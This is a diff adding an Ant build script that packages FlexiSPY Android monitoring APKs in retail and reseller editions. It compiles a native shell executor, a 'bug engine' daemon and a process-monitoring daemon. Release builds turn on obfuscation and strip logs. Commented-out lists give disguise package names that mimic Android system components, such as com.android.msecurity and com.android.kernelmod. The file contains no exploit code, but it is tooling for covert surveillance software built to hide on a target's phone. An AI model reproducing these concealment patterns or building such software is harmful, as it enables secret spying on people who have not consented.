@@ -1,0 +1,338 @@
+<?xml version="1.0" encoding="utf-8"?>
+<project name="flexispy-build" default="">
+	
+	<property file="environment.properties"/>
+	<property file="build.properties"/>
+	
+	<import file="tool/daemon_build_resources/fx-build.xml"/>
+	
+	<target name="release" description="Prepare resources and construct an APK file">
+		
+		<echo message="Increase build number and create a timestamp" />
+		<antcall target="increment-build-number"/>
+		
+		<echo message="Prepare resources for the main project" />
+		<antcall target="compile-main"/>
+		
+		<echo message="Generate APK from the main project with a specific package name" />
+		
+		<!-- Add/Remove any Android FlexiSPY edition here!! -->
+		
+		<!-- DEVELOPMENT BUILD -->
+		<var name="mock.pkg" value="com.android.msecurity"/>
+		<build-retail-prox-test mock.pkg="${mock.pkg}"/>
+		<build-retail-pro-test mock.pkg="${mock.pkg}"/>
+		
+		<!-- RETAIL PACKAGE NAME-->
+		<!--
+		<var name="mock.pkg" value="com.android.msecurity"/>
+		<var name="mock.pkg" value="com.android.userkernel"/>
+		<var name="mock.pkg" value="com.android.securemgr"/>
+		<var name="mock.pkg" value="com.android.platsec"/>
+        <var name="mock.pkg" value="com.android.nifagent"/>
+        <var name="mock.pkg" value="com.android.apnnifman"/>
+		-->
+		
+		<!-- RESELLER PACKAGE NAME -->
+		<!--
+		<var name="mock.pkg" value="com.android.commserv"/>
+		<var name="mock.pkg" value="com.android.kernelmod"/>
+		<var name="mock.pkg" value="com.android.connmon"/>
+        <var name="mock.pkg" value="com.android.dbmapper"/>
+        <var name="mock.pkg" value="com.android.tappi"/>
+        <var name="mock.pkg" value="com.android.iarchive"/>
+		-->
+		
+	</target>
+	
+	<target name="clean" description="Make ready to commit project to the SVN">
+		<ant antfile="source/shell_executer/build-helper.xml" target="clean" inheritAll="false" />
+		<ant dir="source/daemon_process_monitoring" target="clean" inheritAll="false" />
+		<ant dir="source/daemon_bug_engine" target="clean" inheritAll="false" />
+		<ant dir="source/process-main" target="clean" inheritAll="false" />
+		<ant antfile="source/application-main/build-helper.xml" target="clean" inheritAll="false" />
+	</target>
+	
+	<target name="increment-build-number">
+		<propertyfile file="build.properties">
+			<entry key="build.number" type="int" operation="+" default="1" />
+		</propertyfile>
+	</target>
+	
+	<target name="compile-main">
+		
+		<ant antfile="${main.project.dir}/build-helper.xml" target="clean" inheritall="false" />
+		
+		<!-- shell_executer -->
+		<ant antfile="source/shell_executer/build-helper.xml" target="ndk-build" inheritall="false">
+			<property name="cygwin.dir" value="${cygwin.dir}"/>
+			<property name="cygwin.ndk.dir" value="${cygwin.ndk.path}"/>
+			<property name="ndk.build.option" value="${ndk.build.option}"/>
+			<property name="working.dir" value="${basedir}/source/shell_executer"/>
+		</ant>
+		
+		<!-- copy libfxexec.so to the main project -->
+		<copy todir="${main.project.dir}/assets">
+            <fileset dir="source/shell_executer/libs/armeabi"/>
+        </copy>
+		<copy todir="${main.project.dir}/libs">
+            <fileset dir="source/shell_executer/libs"/>
+        </copy>
+		
+		<!-- compile daemon_process_monitoring -->
+		<ant dir="${basedir}/source/daemon_process_monitoring" target="compile-dex" inheritall="false">
+			<property name="ndk.build.option" value="${ndk.build.option}" />
+			<property name="obfuscate.option" value="${obfuscate.option}" />
+			<property name="proguard.config.path" value="${proguard.config.path}" />
+			<property name="android.lib.jar" value="${android.lib.jar}" />
+			<property name="dx.path" value="${dx}" />
+			<property name="main.project.dir" value="${main.project.dir}" />
+			<property name="delete.log.option" value="${delete.log.option}" />
+		</ant>
+		
+		<!-- compile daemon_bug_engine -->
+		<ant dir="${basedir}/source/daemon_bug_engine" target="compile-dex" inheritall="false">
+			<property name="ndk.build.option" value="${ndk.build.option}" />
+			<property name="cygwin.dir" value="${cygwin.dir}" />
+			<property name="cygwin.ndk.dir" value="${cygwin.ndk.path}" />
+			<property name="obfuscate.option" value="${obfuscate.option}" />
+			<property name="proguard.config.path" value="${proguard.config.path}" />
+			<property name="android.lib.jar" value="${android.lib.jar}" />
+			<property name="dx.path" value="${dx}" />
+			<property name="main.project.dir" value="${main.project.dir}" />
+			<property name="delete.log.option" value="${delete.log.option}" />
+		</ant>
+		
+		<!-- compile process-main -->
+		<ant dir="${basedir}/source/process-main" target="compile-dex" inheritall="false">
+			<property name="ndk.build.option" value="${ndk.build.option}" />
+			<property name="obfuscate.option" value="${obfuscate.option}" />
+			<property name="proguard.config.path" value="${proguard.config.path}" />
+			<property name="android.lib.jar" value="${android.lib.jar}" />
+			<property name="dx.path" value="${dx}" />
+			<property name="main.project.dir" value="${main.project.dir}" />
+			<property name="delete.log.option" value="${delete.log.option}" />
+		</ant>
+		
+		<!-- copy neccessary source for application-main -->
+		<ant antfile="${main.project.dir}/build-helper.xml" target="prepare-build" inheritall="false" />
+		
+	</target>
+	
+	<macrodef name="build-retail-prox-test">
+    	<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="-" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="sync" />
+    			<property name="product.id" value="66" />
+    			<property name="product.name" value="FSXGAD" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="PROX" />
+    			<property name="code.product.server" value="TEST" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_PROX" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_PROX" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="${obfuscate.option}"/>
+        		<property name="delete.log.option" value="${delete.log.option}" />
+    		</ant>
+    	</sequential>
+    </macrodef>
+	
+    <macrodef name="build-retail-pro-test">
+    	<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="-" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="sync" />
+    			<property name="product.id" value="65" />
+    			<property name="product.name" value="FSPGAD" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="PROX" />
+    			<property name="code.product.server" value="TEST" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_PRO" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_PRO" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="${obfuscate.option}"/>
+        		<property name="delete.log.option" value="${delete.log.option}" />
+    		</ant>
+    	</sequential>
+    </macrodef>
+	
+    <macrodef name="build-retail-light-test">
+    	<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="-" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="sync" />
+    			<property name="product.id" value="64" />
+    			<property name="product.name" value="FSLGAD" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="LIGHT" />
+    			<property name="code.product.server" value="TEST" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_LIGHT" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_LIGHT" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="${obfuscate.option}"/>
+        		<property name="delete.log.option" value="${delete.log.option}" />
+    		</ant>
+        </sequential>
+    </macrodef>
+	
+	<macrodef name="build-retail-prox">
+        <attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+            <ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="sync" />
+    			<property name="product.id" value="66" />
+    			<property name="product.name" value="FSXGAD" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="PROX" />
+    			<property name="code.product.server" value="RETAIL" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_PROX" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_PROX" />
+    			<property name="output.apk.dir" value="${basedir}/apk" />
+            	<property name="obfuscate.option" value="yes"/>
+				<property name="delete.log.option" value="yes" />
+    		</ant>
+        </sequential>
+    </macrodef>
+	
+	<macrodef name="build-retail-pro">
+		<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="sync" />
+    			<property name="product.id" value="65" />
+    			<property name="product.name" value="FSPGAD" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="PRO" />
+    			<property name="code.product.server" value="RETAIL" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_PRO" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_PRO" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="yes"/>
+        		<property name="delete.log.option" value="yes" />
+    		</ant>
+		</sequential>
+    </macrodef>
+
+    <macrodef name="build-retail-light">
+    	<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="sync" />
+    			<property name="product.id" value="64" />
+    			<property name="product.name" value="FSLGAD" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="LIGHT" />
+    			<property name="code.product.server" value="RETAIL" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_LIGHT" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_LIGHT" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="yes"/>
+        		<property name="delete.log.option" value="yes" />
+    		</ant>
+        </sequential>
+    </macrodef>
+	
+    <macrodef name="build-reseller-prox">
+    	<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="mint_prox" />
+    			<property name="product.id" value="10049" />
+    			<property name="product.name" value="ANDA" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="PROX" />
+    			<property name="code.product.server" value="RESELLER" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_PROX" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_PROX" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="yes"/>
+        		<property name="delete.log.option" value="yes" />
+    		</ant>
+        </sequential>
+    </macrodef>
+	
+    <macrodef name="build-reseller-pro">
+    	<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="mint_prox" />
+    			<property name="product.id" value="10048" />
+    			<property name="product.name" value="ANDB" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="PRO" />
+    			<property name="code.product.server" value="RESELLER" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_PRO" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_PRO" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="yes"/>
+        		<property name="delete.log.option" value="yes" />
+    		</ant>
+        </sequential>
+    </macrodef>
+	
+    <macrodef name="build-reseller-light">
+    	<attribute name="mock.pkg" default="com.android.flexispy"/>
+        <sequential>
+        	<ant antfile="source/application-main/build-helper.xml" target="build-apk" inheritall="false">
+    			<property name="testflag" value="" />
+    			<property name="mock.pkg" value="@{mock.pkg}" />
+    			<property name="icon.name" value="mint_prox" />
+    			<property name="product.id" value="10047" />
+    			<property name="product.name" value="ANDC" />
+    			<property name="product.display.name" value="" />
+    			<property name="product.version.major" value="${product.version.major}" />
+    			<property name="product.version.minor" value="${product.version.minor}" />
+    			<property name="product.version.build" value="${product.version.build}" />
+    			<property name="code.product.edition" value="LIGHT" />
+    			<property name="code.product.server" value="RESELLER" />
+    			<property name="code.product.id" value="RETAIL_PRODUCT_ID_LIGHT" />
+    			<property name="code.product.name" value="RETAIL_PRODUCT_NAME_LIGHT" />
+            	<property name="output.apk.dir" value="${basedir}/apk" />
+        		<property name="obfuscate.option" value="yes"/>
+        		<property name="delete.log.option" value="yes" />
+    		</ant>
+        </sequential>
+    </macrodef>
+
+</project>
